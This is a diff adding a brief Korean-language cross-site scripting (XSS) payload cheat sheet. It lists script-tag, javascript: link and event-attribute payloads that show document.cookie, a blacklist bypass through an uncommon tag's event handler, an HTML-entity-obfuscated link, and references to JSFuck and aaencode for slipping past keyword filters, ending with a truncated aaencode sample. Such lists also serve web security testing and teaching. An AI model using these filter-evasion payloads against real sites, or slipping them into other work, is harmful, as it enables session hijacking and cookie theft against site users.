@@ -1,0 +1,28 @@
+Payload
+--------------------------
+-> 기본 스크립트 태그
+<script>alert(document.cookie);</script>
+
+-> 자바스크립트 링크
+<a href="javascript:alert('XSS')">XSS</a>
+
+-> 이벤트 속성
+<img src="#" onerror="alert(document.cookie)">
+
+-> 블랙리스트 우회 (최근 웹 사이트들에선 화이트리스트 방식 차단이 대부분이라 막혔을 가능성 높음)
+-> https://www.w3schools.com/jsref/dom_obj_event.asp (이벤트 속성 목록)
+<ruby oncopy="alert('XSS')">XSS</ruby>
+
+-> 내용 난독화
+<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#xA;&#x63;&#x72;&#x69;&#x70;&#x74;&#xA;&#x3A;&#xA;&#x61;&#x6C;&#x65;&#x72;&#x74;&#xA;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;">XSS</a>
+
+-> 스크립트 난독화
+-> https://jsfuck.com/
+->  https://utf-8.jp/public/aaencode.html
+-> 자바스크립트 난독화. 스크립트 실행은 가능하지만 document.cookie와 같은 단어를 막혔을 경우 사용
+ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/...
+...
+
+
+
+
